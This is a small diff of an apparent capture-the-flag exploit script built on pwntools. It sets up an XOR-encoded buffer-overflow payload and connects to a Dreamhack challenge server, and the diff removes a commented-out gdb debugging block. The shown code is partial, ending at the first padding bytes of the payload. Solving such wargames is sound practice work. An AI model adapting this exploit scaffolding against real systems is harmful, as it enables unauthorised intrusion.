@@ -73,30 +73,17 @@ from pwn import *
 
 def calc_payload(input: bytes) -> bytes:
     barr = bytearray(input)
-
     l = len(input)
-
     for i in range(l):
         x = 0
         for j in range(i, l):
             x ^= barr[j]
         barr[i] = x
-
     return barr
 
 context.arch = "amd64"  # i386
 context.log_level = "debug"
 
-# p = gdb.debug(
-#     "./prob_patched",
-#     """
-# b main
-# brva 0x12FB
-# c
-# b *do_system+0x17A
-# c
-# """,
-# )
 p = remote("host3.dreamhack.games", 15530)
 
 plain = b"A" * 0x18 + b"B"
